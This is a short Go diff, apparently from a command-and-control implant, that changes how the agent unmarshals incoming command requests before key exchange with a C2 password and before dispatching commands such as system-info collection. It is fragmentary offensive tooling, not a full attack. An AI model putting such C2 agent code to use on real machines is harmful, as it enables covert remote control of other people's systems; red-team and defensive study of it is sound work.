@@ -65,7 +65,7 @@ type Agent struct {
 	crypto   Crypto
 	sendq    map[string]AgentCommand                    // map["010FF.chunk"] = 0xff
 	recvq    map[AgentCommand]map[string]map[int][]byte // map[0x01] = ["data_id"] = [0 = chunk1, 1 = chunk2]
-	sentKey bool
+	sentKey  bool
 	config   config.Config
 	shutdown bool
 }
@@ -390,7 +390,13 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_
 	delete(a.recvq, command)
 
 	if command == AgentCommand_AGENT_KEYX {
-		err := a.crypto.ComputeSharedSecret(data, a.config.C2Password)
+		commandRequest, unmarshalError := unmarshalCommandRequest(data)
+		if unmarshalError != nil {
+			log.Printf("failed unmarshal command request: %x (err: %q)\n", data, unmarshalError)
+			return
+		}
+
+		err := a.crypto.ComputeSharedSecret(commandRequest.Input, a.config.C2Password)
 		if err != nil {
 			log.Printf("failed to compute secret with pubkey: %x (err: %q)\n", data, err)
 			return
@@ -404,6 +410,13 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_
 		log.Printf("error decrypting data for command %q: %x (err: %q)\n", command, data, err)
 		return
 	}
+
+	commandRequest, unmarshalError := unmarshalCommandRequest(decryptedData)
+	if unmarshalError != nil {
+		log.Printf("failed unmarshal command request: %x (err: %q)\n", data, unmarshalError)
+		return
+	}
+	decryptedData = commandRequest.Input
 
 	switch command {
 	case AgentCommand_AGENT_SYSINFO:
